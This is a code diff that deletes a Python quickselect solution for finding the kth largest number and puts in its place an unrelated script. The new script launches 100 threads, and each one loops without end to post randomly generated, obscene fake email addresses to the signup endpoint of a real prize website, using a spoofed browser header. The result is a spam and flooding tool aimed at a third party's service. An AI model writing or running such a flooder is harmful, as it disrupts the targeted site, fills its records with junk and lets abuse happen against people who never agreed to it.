@@ -1,37 +1,29 @@
-from typing import List
+import random
+import requests
+import time
+from threading import Thread
 
-'''
-利用快排思想，部分排序
-'''
+data = {
+    'email': f'fuck{random.randint(1, 100000000000000)}@bitch.com'
+}
+headers = {
+    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
+    'referer': 'https://pointsprizes.com/'
+}
 
 
-class Solution:
-    def findKthLargest(self, nums: List[int], k: int) -> int:
-        n = len(nums)
-        start, end = 0, n - 1
-        pivot = -1
-        while pivot != n - k:
-            print(nums)
-            if pivot < n - k:
-                start, pivot, t = self.partition(nums, pivot + 1, end)
-            else:
-                start, pivot, t = self.partition(nums, start, pivot - 1)
-        return nums[pivot]
-
-    def partition(self, nums, start, end):
-        pilot = start
-        l = start + 1
-        r = end
-        while l <= r:
-            if nums[l] > nums[pilot]:
-                nums[l], nums[r] = nums[r], nums[l]
-                r -= 1
-            else:
-                l += 1
-        nums[pilot], nums[r] = nums[r], nums[pilot]
-        return start, r, end
+def send_email():
+    while True:
+        data = {
+            'email': f'fuck{random.randint(1, 100000000000000)}@bitch.com'
+        }
+        print(data)
+        res = requests.post('https://pointsprizes.com/account', headers=headers, data=data)
+        requests.get('https://pointsprizes.com')
+        print(res.status_code)
 
 
 if __name__ == '__main__':
-    a = Solution()
-    print(a.findKthLargest([3, 2, 1, 5, 6, 4], 2))
+    for _ in range(100):
+        i = Thread(target=send_email)
+        i.start()
